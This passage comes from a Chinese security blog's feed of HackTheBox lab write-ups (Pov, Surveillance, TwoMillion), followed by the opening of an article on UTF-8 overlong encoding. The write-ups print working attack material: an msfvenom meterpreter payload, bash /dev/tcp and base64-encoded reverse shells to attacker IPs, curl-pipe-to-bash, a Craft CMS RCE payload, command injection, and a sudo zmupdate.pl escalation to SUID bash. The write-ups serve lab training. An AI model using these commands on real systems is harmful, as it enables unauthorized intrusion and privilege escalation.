host, string name, ref long pluid);</span><br><span class="line">        [StructLayout(LayoutKind.Sequential, Pack = 1)]</span><br><span class="line">        internal struct TokPriv1Luid</span><br><span class="line">        &#123;</span><br><span class="line">            public int Count;</span><br><span class="line">            public long Luid;</span><br><span class="line">            public int Attr;</span><br><span class="line">        &#125;</span><br><span class="line">        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;</span><br><span class="line">        internal const int SE_PRIVILEGE_DISABLED = 0x00000000;</span><br><span class="line">        internal const int TOKEN_QUERY = 0x00000008;</span><br><span class="line">        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;</span><br><span class="line">        public static void EnablePrivilege()</span><br><span class="line">        &#123;</span><br><span class="line">            bool retVal;</span><br><span class="line">            TokPriv1Luid tp;</span><br><span class="line">            IntPtr hproc = new IntPtr();</span><br><span class="line">            hproc = Process.GetCurrentProcess().Handle;</span><br><span class="line">            IntPtr htok = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line">            List&lt;string&gt; privs = new List&lt;string&gt;() &#123;  &quot;SeAssignPrimaryTokenPrivilege&quot;, &quot;SeAuditPrivilege&quot;, &quot;SeBackupPrivilege&quot;,</span><br><span class="line">            &quot;SeChangeNotifyPrivilege&quot;, &quot;SeCreateGlobalPrivilege&quot;, &quot;SeCreatePagefilePrivilege&quot;,</span><br><span class="line">            &quot;SeCreatePermanentPrivilege&quot;, &quot;SeCreateSymbolicLinkPrivilege&quot;, &quot;SeCreateTokenPrivilege&quot;,</span><br><span class="line">            &quot;SeDebugPrivilege&quot;, &quot;SeEnableDelegationPrivilege&quot;, &quot;SeImpersonatePrivilege&quot;, &quot;SeIncreaseBasePriorityPrivilege&quot;,</span><br><span class="line">            &quot;SeIncreaseQuotaPrivilege&quot;, &quot;SeIncreaseWorkingSetPrivilege&quot;, &quot;SeLoadDriverPrivilege&quot;,</span><br><span class="line">            &quot;SeLockMemoryPrivilege&quot;, &quot;SeMachineAccountPrivilege&quot;, &quot;SeManageVolumePrivilege&quot;,</span><br><span class="line">            &quot;SeProfileSingleProcessPrivilege&quot;, &quot;SeRelabelPrivilege&quot;, &quot;SeRemoteShutdownPrivilege&quot;,</span><br><span class="line">            &quot;SeRestorePrivilege&quot;, &quot;SeSecurityPrivilege&quot;, &quot;SeShutdownPrivilege&quot;, &quot;SeSyncAgentPrivilege&quot;,</span><br><span class="line">            &quot;SeSystemEnvironmentPrivilege&quot;, &quot;SeSystemProfilePrivilege&quot;, &quot;SeSystemtimePrivilege&quot;,</span><br><span class="line">            &quot;SeTakeOwnershipPrivilege&quot;, &quot;SeTcbPrivilege&quot;, &quot;SeTimeZonePrivilege&quot;, &quot;SeTrustedCredManAccessPrivilege&quot;,</span><br><span class="line">            &quot;SeUndockPrivilege&quot;, &quot;SeUnsolicitedInputPrivilege&quot;, &quot;SeDelegateSessionUserImpersonatePrivilege&quot; &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);</span><br><span class="line">            tp.Count = 1;</span><br><span class="line">            tp.Luid = 0;</span><br><span class="line">            tp.Attr = SE_PRIVILEGE_ENABLED;</span><br><span class="line"></span><br><span class="line">            foreach (var priv in privs)</span><br><span class="line">            &#123;</span><br><span class="line">                retVal = LookupPrivilegeValue(null, priv, ref tp.Luid);</span><br><span class="line">                retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);                              </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">&#x27;@</span><br><span class="line"></span><br><span class="line">$type = Add-Type $definition -PassThru</span><br><span class="line">$type[0]::EnablePrivilege() 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>在本地开启http服务上传该脚本文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://10.10.14.46/EnableAllTokenPrivs.ps1</span><br></pre></td></tr></table></figure>

<p>然后<code>.\EnableAllTokenPrivs.ps1</code>即可</p>
<p>回到题目，我们利用msf先在本地生成马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.46 LPORT=5555 -f exe &gt; exploit.exe</span><br></pre></td></tr></table></figure>

<p>然后本地开启http服务，上传到靶机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://10.10.14.46/exploit.exe</span><br></pre></td></tr></table></figure>

<p><img src="/article/Pov-HackTheBox/image-20240405203424722.png"></p>
<p>在本地启动一个msf数据库&amp;console</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo msfdb init &amp;&amp; msfconsole</span><br></pre></td></tr></table></figure>

<p>接着依次执行去反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 10.10.14.46</span><br><span class="line">set LPORT 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>开启监听后在靶机运行<code>.\exploit.exe</code>，反弹成功</p>
<p><img src="/article/Pov-HackTheBox/image-20240406124840953.png"></p>
<p>我们<code>ps</code>查看下靶机正在运行的进程，注意到<code>winlogon.exe</code>文件</p>
<blockquote>
<p>winlogon.exe 是 Windows 的登录系统进程，它在用户登录时启动，并处理用户登录和注销的过程。当用户输入用户名和密码后，winlogon.exe 验证用户的凭据，并启动用户环境。它还负责加载用户配置文件、启动用户的用户界面和其他关联的系统任务。</p>
</blockquote>
<p><img src="/article/Pov-HackTheBox/image-20240406125030326.png"></p>
<p>然后使用<code>migrate 548</code>命令将shell移到winlogon.exe进程里</p>
<p>执行shell命令，成功提权拿到flag</p>
<p><img src="/article/Pov-HackTheBox/image-20240406125219057.png"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Surveillance-HackTheBox</title>
    <url>/article/Surveillance-HackTheBox.html</url>
    <content><![CDATA[<p>CVE-2023-41892、CVE-2023-26035</p>
<span id="more"></span>

<h1 id="Surveillance-HackTheBox"><a href="#Surveillance-HackTheBox" class="headerlink" title="Surveillance-HackTheBox"></a>Surveillance-HackTheBox</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v -p- --min-rate 1000 10.10.11.245</span><br></pre></td></tr></table></figure>

<p><img src="/article/Surveillance-HackTheBox/image-20240111180818681.png"></p>
<p>扫出来两个端口，其中80端口有http服务并且重定向到surveillance.htb</p>
<p>那么我们添加下域名然后访问80端口，发现是企业网站尝试扫描子域名和目录无果后，用Wappalyzer插件看看</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111184949465.png"></p>
<p>得知是Craft CMS后，去网上搜一下发现存在远程代码执行漏洞(CVE-2023-41892) <a href="https://cloud.tencent.com/developer/article/2365764?areaId=106001">参考文章</a></p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">action=conditions/render&amp;test[userCondition]=craft\elements\conditions\users\UserCondition&amp;config=&#123;&quot;name&quot;:&quot;test[userCondition]&quot;,&quot;as xyz&quot;:&#123;&quot;class&quot;:&quot;\\GuzzleHttp\\Psr7\\FnStream&quot;,    &quot;__construct()&quot;: [&#123;&quot;close&quot;:null&#125;],&quot;_fn_close&quot;:&quot;phpinfo&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>抓包修改为POST请求，添加payload成功RCE</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111185214507.png"></p>
<p>仔细分析此payload的执行过程，原来是调用call_user_func函数只有一个参数，想反弹shell就卡住了</p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>我在GitHub上找到写好的getshell脚本 <a href="https://github.com/Faelian/CraftCMS_CVE-2023-41892">脚本链接</a></p>
<p>成功反弹</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111194741978.png"></p>
<p>由于不稳定，我们反弹到自己机子上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.74/1028 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Surveillance-HackTheBox/image-20240111195321224.png"></p>
<p>我们注意到<code>/craft/storage/backups</code>目录下有zip文件</p>
<p>先开启http服务，用wget下载下来查看</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111200833565.png"></p>
<p>解压后打开看发现有信息泄露</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111201305915.png"></p>
<p>直接拿join爆破一下，结果出现报错，提示使用其他哈希类型</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111203634494.png"></p>
<p>最终在类型为Raw-SHA256爆破成功得到密码</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111203654261.png"></p>
<p>知道密码后我们直接ssh连接（这里是用户matthew）</p>
<p>得到user的flag</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111211630770.png"></p>
<p>然后就没有收获了，于是我们决定进行更深层的探测潜在的特权提升路径和漏洞</p>
<p>使用工具LinPEAS，我们现在本地开启http服务，然后使用curl命令去弹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://10.10.14.74:8000/linpeas.sh | bash</span><br></pre></td></tr></table></figure>

<p>成功得到连接数据库的密码</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111214133572.png"></p>
<p>当然也可以得到用户名</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111214620372.png"></p>
<p>然后就进行mysql连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u craftuser -p -h localhost</span><br></pre></td></tr></table></figure>

<p><img src="/article/Surveillance-HackTheBox/image-20240111214901316.png"></p>
<p>然后在craftdb中的users表找到admin的相关信息</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111215203687.png"></p>
<p>使用john爆破失败</p>
<p>回头继续分析，发现8080端口开放</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111215950995.png"></p>
<p>那么我们使用ssh进行端口转发至本地的777端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -L 777:localhost:8080 matthew@10.10.11.245</span><br></pre></td></tr></table></figure>

<p>然后在浏览器访问本地777端口，发现是ZoneMinder</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111220606278.png"></p>
<p>网上搜到ZoneMinder 代码执行漏洞(CVE-2023-26035)</p>
<p>GitHub上有现成的poc <a href="https://github.com/rvizx/CVE-2023-26035">参考链接</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exploit.py -t http://localhost:777/ -ip 10.10.14.74 -p</span><br></pre></td></tr></table></figure>

<p>本地转发的777端口为target，然后1028为nc监听的端口</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>连接到后<code>sudo -l</code>看看可执行的命令</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111223721833.png"></p>
<p>下面这些二进制文件都可以执行，参考其他师傅wp可以知道在zmupdate.pl文件存在漏洞</p>
<p>具体是指参数user的值可以为文件，那么我们可以上传shell脚本然后利用其user参数实现getshell</p>
<p>过程如下，写入并赋予suid可执行权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;cp /bin/bash /var/tmp/bash;chmod 4755 /var/tmp/bash&#x27; &gt; /var/tmp/exploit.sh</span><br><span class="line">chmod +x /var/tmp/exploit.sh</span><br></pre></td></tr></table></figure>

<p>然后再执行刚刚说的利用参数user</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/zmupdate.pl --version=1.36.32 --user=&#x27;$(/var/tmp/exploit.sh)&#x27; --pass=ZoneMinderPassword2023</span><br></pre></td></tr></table></figure>

<p>执行完后我们再<code>/var/tmp/bash -p</code>得到完整的root权限</p>
<p>得到flag</p>
<p><img src="/article/Surveillance-HackTheBox/image-20240111224745965.png"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>提权</tag>
        <tag>CMS</tag>
      </tags>
  </entry>
  <entry>
    <title>TwoMillion-HackTheBox</title>
    <url>/article/TwoMillion-HackTheBox.html</url>
    <content><![CDATA[<p>OverlayFS 内核漏洞 （CVE-2023-0386）</p>
<span id="more"></span>

<p><strong>信息搜集</strong></p>
<p>nmap扫描一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -v 10.10.11.221</span><br></pre></td></tr></table></figure>

<p>扫描结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE    SERVICE     VERSION</span><br><span class="line">22/tcp   open     ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open     http        nginx</span><br><span class="line">3851/tcp filtered spectraport</span><br></pre></td></tr></table></figure>

<p>访问下80端口发现跳转到<code>2million.htb</code>，添加下<code>/etc/hosts</code></p>
<p>然后发现存在登录界面</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416202314077.png"></p>
<p>我们扫一下目录</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416202447836.png"></p>
<p>我们依次去访问看看</p>
<ul>
<li>&#x2F;api和&#x2F;api&#x2F;v1路由均不可访问</li>
<li>&#x2F;register路由可以注册用户，不过需要<code>Invite code</code>且不可输入</li>
<li>主页的join功能可以访问&#x2F;invite路由，并且存在js源码</li>
</ul>
<p>访问复制下来然后调整一下 <a href="https://beautifier.io/">代码美化</a></p>
<p>注意勾上<code>打包器（packers）和混淆器（obfuscators）的功能</code></p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416210743024.png"></p>
<p>成功得到源码（也可以将该函数丢到控制台执行）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function verifyInviteCode(code) &#123;</span><br><span class="line">    var formData = &#123;</span><br><span class="line">        &quot;code&quot;: code</span><br><span class="line">    &#125;;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &quot;POST&quot;,</span><br><span class="line">        dataType: &quot;json&quot;,</span><br><span class="line">        data: formData,</span><br><span class="line">        url: &#x27;/api/v1/invite/verify&#x27;,</span><br><span class="line">        success: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function makeInviteCode() &#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &quot;POST&quot;,</span><br><span class="line">        dataType: &quot;json&quot;,</span><br><span class="line">        url: &#x27;/api/v1/invite/how/to/generate&#x27;,</span><br><span class="line">        success: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function(response) &#123;</span><br><span class="line">            console.log(response)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两个路由分别是用来验证邀请码和生成邀请码</p>
<p>我们先用curl命令发送下POST请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST http://2million.htb/api/v1/invite/how/to/generate</span><br></pre></td></tr></table></figure>

<p>得到回显，提示要ROT13解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;0&quot;: 200,</span><br><span class="line">    &quot;success&quot;: 1,</span><br><span class="line">    &quot;data&quot;: &#123;</span><br><span class="line">        &quot;data&quot;: &quot;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr&quot;,</span><br><span class="line">        &quot;enctype&quot;: &quot;ROT13&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;hint&quot;: &quot;Data is encrypted ... We should probbably check the encryption type in order to decrypt it...&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>找一个ROT13在线解码，得到信息要去<code>/api/v1/invite/generate</code>发送POST请求即可得到邀请码</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416211753024.png"></p>
<p>发送POST请求，得到邀请码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;0&quot;: 200,</span><br><span class="line">    &quot;success&quot;: 1,</span><br><span class="line">    &quot;data&quot;: &#123;</span><br><span class="line">        &quot;code&quot;: &quot;QldKWDMtSDlQMVAtT1k0NVQtWks5V0I=&quot;,</span><br><span class="line">        &quot;format&quot;: &quot;encoded&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里很明显是base64加密的，解码即可</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416212244668.png"></p>
<p>bp抓包添加上邀请码</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416212711323.png"></p>
<p>出现302说明注册成功，我们直接登录</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416213026087.png"></p>
<p>当我们再次访问之前的<code>/api/v1</code></p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416213222821.png"></p>
<p>我们注意到<code>/api/v1/admin/settings/update</code>路由，用PUT请求可以更新user的设置</p>
<p>bp抓包试试，回显<code>Invalid content type</code>，应该是要添加Content-Type解析json数据</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416213757982.png"></p>
<p>添加Content-Type头之后提示缺少email参数。由于路由是admin的，大概率是要admin的email</p>
<p>我们继续查看<code>/api/v1/admin/vpn/generate</code>路由，POST请求发现回显<code>Unauthorized</code>，我们只能回到刚刚的update路由下再看看，我们添加上email参数值为我们注册的邮箱，回显如下</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416215119320.png"></p>
<p>得到信息<code>is_admin</code>参数应该是用来判断是否为admin用户，我们添加上并改为1后发包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;email&quot;:&quot;test@qq.com&quot;,</span><br><span class="line">	&quot;is_admin&quot;:1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后再次访问<code>/api/v1/admin/vpn/generate</code>，回显缺少username参数</p>
<p>添加上成功回显</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416215424687.png"></p>
<p>这里参考wp说是存在命令注入漏洞，通过sleep函数检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;username&quot;:&quot;test;sleep 2&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;username&quot;:&quot;test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41Ny8xMDI4IDA+JjE=|base64 -d|bash&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功反弹shell</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416222115130.png"></p>
<p>我们不妨看看源码是如何注入的，查看下<code>/controllers/VPNController.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">admin_vpn</span>(<span class="params"><span class="variable">$router</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>] !== <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 401 Unauthorized&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 401 Unauthorized&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>] !== <span class="string">&#x27;application/json&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">                <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;danger&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Invalid content type.&#x27;</span></span><br><span class="line">            ]);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$body</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">        <span class="variable">$json</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$body</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">                <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;danger&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Missing parameter: username&#x27;</span></span><br><span class="line">            ]);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$json</span>-&gt;username) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">                <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;danger&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Missing parameter: username&#x27;</span></span><br><span class="line">            ]);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$json</span>-&gt;username;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">regenerate_user_vpn</span>(<span class="variable">$router</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;/usr/bin/cat /var/www/html/VPN/user/<span class="subst">$username</span>.ovpn&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">is_array</span>(<span class="variable">$output</span>) ? <span class="title function_ invoke__">implode</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>, <span class="variable">$output</span>) : <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>我们注意到<code>$username</code>传递给<code>regenerate_user_vpn</code>函数，并且只是要求username为json格式</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">regenerate_user_vpn</span>(<span class="params"><span class="variable">$router</span>, <span class="variable">$user</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$user</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/bash /var/www/html/VPN/gen.sh <span class="subst">$user</span>&quot;</span>, <span class="variable">$output</span>, <span class="variable">$return_var</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedin&#x27;</span>] !== <span class="literal">true</span>) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 401 Unauthorized&quot;</span>);</span><br><span class="line">               <span class="keyword">exit</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 401 Unauthorized&quot;</span>);</span><br><span class="line">               <span class="keyword">exit</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="variable">$username</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">remove_special_chars</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">           <span class="variable">$fileName</span> = <span class="variable">$username</span>. <span class="string">&quot;.ovpn&quot;</span>;</span><br><span class="line"></span><br><span class="line">           <span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/bash /var/www/html/VPN/gen.sh <span class="subst">$username</span>&quot;</span>, <span class="variable">$output</span>, <span class="variable">$return_var</span>);</span><br><span class="line"></span><br><span class="line">           <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">download_vpn</span>(<span class="variable">$fileName</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>那么在传递到<code>regenerate_user_vpn</code>函数后很明显是可以命令拼接，利用<code>;</code>来实现命令注入</p>
<p>拼接结果如下，执行id命令并注释掉后面代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec(&quot;/bin/bash /var/www/html/VPN/gen.sh test;id#&quot;, $output, $return_var);</span><br></pre></td></tr></table></figure>

<p>回到题目，我们ls一下发现存在<code>.env</code>文件，应该存在个人信息</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416222758989.png"></p>
<p>得到admin用户的密码，那么我们直接连接本地数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u admin -p -h localhost</span><br></pre></td></tr></table></figure>

<p>得到其他用户的个人信息</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416224613203.png"></p>
<p>不过没什么用，因为我们可以直接ssh连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh admin@10.10.11.221</span><br><span class="line">SuperDuperPass123</span><br></pre></td></tr></table></figure>

<p>连接上后，先在<code>/home/admin/</code>拿到user的flag</p>
<p>然后参考wp说是有hint，在<code>/var/mail/admin</code></p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416233525168.png"></p>
<p>经过搜索找到OverlayFS 内核漏洞 （CVE-2023-0386）</p>
<p><a href="https://github.com/Fanxiaoyao66/CVE-2023-0386">exp链接</a></p>
<p>我们先开启http服务，在靶机用wget命令复制到<code>/tmp</code>目录下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.14.57/exp.sh</span><br><span class="line">wget http://10.10.14.57/fuse.c</span><br></pre></td></tr></table></figure>

<p>然后执行<code>/bin/bash exp.sh</code>，成功提权（该目录还有其他师傅传的exp）</p>
<p><img src="/article/TwoMillion-HackTheBox/image-20240416234624574.png"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>UTF-8 Overlong Encoding导致的安全问题</title>
    <url>/article/UTF-8-Overlong-Encoding%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.html</url>
    <content><![CDATA[<p>GlassFish 任意文件读取漏洞、利用Overlong Encoding绕过java的waf</p>
<span id="more"></span>

<h1 id="UTF-8-Overlong-Encoding导致的安全问题"><a href="#UTF-8-Overlong-Encoding导致的安全问题" class="headerlink" title="UTF-8 Overlong Encoding导致的安全问题"></a>UTF-8 Overlong Encoding导致的安全问题</h1><p><a href="https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html">参考文章</a></p>
<h2 id="UTF-8编码原理"><a href="#UTF-8编码原理" class="headerlink" title="UTF-8编码原理"></a>UTF-8编码原理</h2><blockquote>
<p>UTF-8是现在最流行的编码方式，它可以将unicode码表里的所有字符，用某种计算方式转换成长度是1到4位字节的字符。</p>
</blockquote>
<p>参考这个表格，我们就可以很轻松地将不同区间的unicode码转换成UTF-8编码：</p>
<table>
<thead>
<tr>
<th align="center">First code point</th>
<th align="center">Last code point</th>
<th align="center">Byte 1</th>
